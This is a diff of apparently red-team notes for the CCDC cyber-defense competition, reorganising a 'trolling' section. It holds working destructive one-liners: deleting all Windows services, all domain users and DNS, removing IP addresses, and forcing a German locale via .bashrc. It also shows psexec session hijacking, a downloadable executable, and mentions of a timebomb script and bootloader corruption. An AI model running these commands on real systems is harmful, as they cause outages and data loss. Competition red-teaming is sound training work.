@@ -89,7 +89,6 @@ pagetitle: Red Teaming for CCDC
   - Make malware that:
     - Makes it so you can only run a certain number of commands before being logged out
     - Makes it so you have to solve a times-table equation to see the result of your command
-    - Changes the language of the system to german (`echo "loadkeys de && localectl set-locale de_DE.UTF-8 && localectl set-keymap de" >> ~/.bashrc`)
   - Get something going for alpine/Nixos
     - Alpine
       - Add a second location for SSH keys 
@@ -248,23 +247,27 @@ pagetitle: Red Teaming for CCDC
   - `timebomb.sh`
   - Corrupt bootloader partitions
 
-**Trolling**
-- By far the most important part of CCDC
-- Spawn message box on Windows:
-  - `Add-Type -AssemblyName PresentationFramework;   [System.Windows.MessageBox]::Show("{message_box_message}", "{message_box_title}", 0, 64)`
+**Trolling on Linux**
 - Wall on linux:
   - `wall "dance"`
-- Spawn 50 notepads:
-  - `1..50 | ForEach-Object {Start-Process notepad}`
-    - Can do something like `calc` or 
-- Set all computers to same background:
-  - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
+- Set language to german: `echo "loadkeys de && localectl set-locale de_DE.UTF-8 && localectl set-keymap de" >> ~/.bashrc`
+
+**Trolling on Windows**
+- Set everything to German: `Install-Language -Language de-DE -CopyToSettings; Set-WinUserLanguageList de-DE -Force; Set-WinSystemLocale -SystemLocale de-DE; Set-WinUILanguageOverride -Language de-DE; Set-Culture de-DE; Set-WinHomeLocation -GeoId 94`
 - `misc::wp /file:{path}` to set the current PC's wallpaper
 - `sc.exe stop dns` to stop dns
   - `sc.exe delete dns` to delete it
   - Delete all services lol: `powershell -c "Get-Service | ForEach-Object { sc.exe delete $_.Name }"`
 - Delete IP on interface: `netsh interface ip delete address "Ethernet" addr={address}`
 - `powershell -c "Get-ADUser -Filter * | ForEach-Object { Remove-ADUser $_ -Confirm:$false }"` to delete domain users
+- Set all computers to same background:
+  - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
+- Make mouse shake: [cold_hands.exe](https://khaelkugler.com/misc_scripts/cold_hands.exe)
+- In another user's session with `psexec.exe -i {session_id} -s powershell.exe -Command "{command}" -accept-eula`
+- Spawn 50 notepads:
+  - `1..50 | ForEach-Object {Start-Process notepad}`
+- Spawn message box on Windows:
+  - `Add-Type -AssemblyName PresentationFramework;   [System.Windows.MessageBox]::Show("{message_box_message}", "{message_box_title}", 0, 64)`
 
 ## Dealing with System Protections
 
